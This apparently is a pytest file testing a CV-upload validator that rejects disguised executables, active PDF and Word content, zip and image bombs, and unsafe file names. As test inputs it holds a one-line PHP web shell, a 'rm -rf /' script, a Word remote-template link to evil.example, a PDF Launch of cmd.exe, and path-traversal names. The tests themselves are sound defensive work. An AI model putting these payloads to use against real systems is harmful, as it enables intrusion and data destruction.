import io
import zipfile

import pytest

from app.security import uploads as up

PUBLIC = up.PUBLIC_CV_EXTENSIONS


def _docx(extra=None, rels=None):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document>hello</w:document>")
        if rels:
            z.writestr("word/_rels/document.xml.rels", rels)
        for name, content in (extra or {}).items():
            z.writestr(name, content)
    return buf.getvalue()


def _pdf(body=b""):
    import fitz

    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((72, 72), "Jane Doe, Python developer")
    out = doc.tobytes()
    doc.close()
    return out + body if body else out


def check(data, name):
    return up.validate_upload(data, name, PUBLIC)


# ------------------------------------------------------------------------------------------ good files pass
def test_real_pdf_docx_and_text_are_accepted():
    assert check(_pdf(), "cv.pdf") == "pdf"
    assert check(_docx(), "cv.docx") == "docx"
    assert check(b"Jane Doe\nPython developer\n", "cv.txt") == "text"


# ----------------------------------------------------------------------------- the extension is not trusted
@pytest.mark.parametrize("payload", [b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 200,          # a Windows executable
                                     b"\x7fELF\x02\x01\x01" + b"\x00" * 100,                    # a Linux executable
                                     b"<?php system($_GET['c']); ?>",                           # a web shell
                                     b"#!/bin/sh\nrm -rf /\n"])
def test_programs_renamed_to_pdf_or_docx_are_refused(payload):
    for name in ("cv.pdf", "cv.docx", "cv.doc"):
        with pytest.raises(up.UploadRejected):
            check(payload, name)


def test_the_wrong_kind_of_document_under_the_right_name_is_refused():
    with pytest.raises(up.UploadRejected):
        check(_docx(), "cv.pdf")             # a Word file called .pdf
    with pytest.raises(up.UploadRejected):
        check(_pdf(), "cv.docx")
    for bad in ("cv.exe", "cv.php", "cv.svg", "cv.html", "cv.zip", "cv"):
        with pytest.raises(up.UploadRejected):
            check(_pdf(), bad)


def test_empty_and_oversized_files_are_refused():
    with pytest.raises(up.UploadRejected):
        check(b"", "cv.pdf")
    with pytest.raises(up.UploadRejected) as e:
        up.validate_upload(b"a" * 2000, "cv.txt", PUBLIC, max_bytes=1000)
    assert e.value.status == 413


# ------------------------------------------------------------------------------------------ active content
def test_pdf_with_javascript_launch_or_embedded_files_is_refused():
    for evil in (b"\n1 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n",
                 b"\n2 0 obj << /S /Launch /F (cmd.exe) >> endobj\n",
                 b"\n3 0 obj << /Type /EmbeddedFile >> endobj\n",
                 b"\n4 0 obj << /S /Java#53cript /J#53 (x) >> endobj\n"):   # name obfuscated with #xx escapes
        with pytest.raises(up.UploadRejected):
            check(_pdf(evil), "cv.pdf")


def test_word_files_with_macros_embedded_objects_or_remote_templates_are_refused():
    with pytest.raises(up.UploadRejected):
        check(_docx({"word/vbaProject.bin": b"x"}), "cv.docx")
    with pytest.raises(up.UploadRejected):
        check(_docx({"word/embeddings/oleObject1.bin": b"x"}), "cv.docx")
    with pytest.raises(up.UploadRejected):
        check(_docx({"word/evil.exe": b"MZ"}), "cv.docx")
    rels = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    with pytest.raises(up.UploadRejected):
        check(_docx(rels=rels), "cv.docx")
    # an ordinary hyperlink is fine
    ok = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
          'Target="https://linkedin.com/in/x" TargetMode="External"/></Relationships>')
    assert check(_docx(rels=ok), "cv.docx") == "docx"


def test_legacy_doc_with_macros_and_rtf_with_objects_are_refused():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
    assert check(ole + b"plain text body", "cv.doc") == "doc"
    with pytest.raises(up.UploadRejected):
        check(ole + b"_VBA_PROJECT" + b"\x00" * 8, "cv.doc")
    with pytest.raises(up.UploadRejected):
        check(ole + "_VBA_PROJECT".encode("utf-16le"), "cv.doc")
    # an RTF with an embedded object is refused; a plain one is accepted
    rtf = "{BSrtf1 {BSobject BSobjemb{BS*BSobjdata 0105}}}".replace("BS", chr(92)).encode()
    with pytest.raises(up.UploadRejected):
        check(rtf, "cv.doc")
    assert check("{BSrtf1 Hello}".replace("BS", chr(92)).encode(), "cv.doc") == "rtf"


# ------------------------------------------------------------------------------------------------- bombs
def test_zip_bombs_and_unsafe_paths_are_refused():
    bomb = io.BytesIO()
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<d/>")
        z.writestr("word/big.xml", b"0" * (50 * 1024 * 1024))        # 50 MB that compresses to ~50 KB
    assert len(bomb.getvalue()) < 200_000
    with pytest.raises(up.UploadRejected):
        check(bomb.getvalue(), "cv.docx")
    with pytest.raises(up.UploadRejected):
        check(_docx({"../../etc/cron.d/x": b"x"}), "cv.docx")
    many = io.BytesIO()
    with zipfile.ZipFile(many, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<d/>")
        for i in range(up.MAX_ZIP_MEMBERS + 5):
            z.writestr(f"word/p{i}.xml", "x")
    with pytest.raises(up.UploadRejected):
        check(many.getvalue(), "cv.docx")


def test_image_decompression_bombs_are_refused():
    from PIL import Image

    img = Image.new("1", (8000, 8000))                      # 64 million pixels, a few KB as PNG
    buf = io.BytesIO()
    img.save(buf, "PNG")
    with pytest.raises(up.UploadRejected):
        up.validate_upload(buf.getvalue(), "scan.png", up.JD_EXTENSIONS)


# --------------------------------------------------------------------------------------------------- names
def test_file_names_cannot_carry_paths_or_control_characters():
    assert up.safe_filename("../../etc/passwd") == "passwd"
    assert up.safe_filename("C:" + chr(92) + "Users" + chr(92) + "x" + chr(92) + "cv.pdf") == "cv.pdf"
    assert up.safe_filename("a\x00b<script>.pdf") == "a_b_script_.pdf"
    assert up.safe_filename("") == "upload" and len(up.safe_filename("x" * 400 + ".pdf")) <= 180


# ----------------------------------------------------------------------------------------------- streaming
def test_oversized_bodies_are_cut_off_while_reading():
    import asyncio
    from starlette.datastructures import UploadFile

    class Big(io.BytesIO):
        pass

    f = UploadFile(file=io.BytesIO(b"x" * (3 * 1024 * 1024)), filename="cv.txt")
    with pytest.raises(up.UploadRejected):
        asyncio.run(up.read_limited(f, 1024 * 1024))
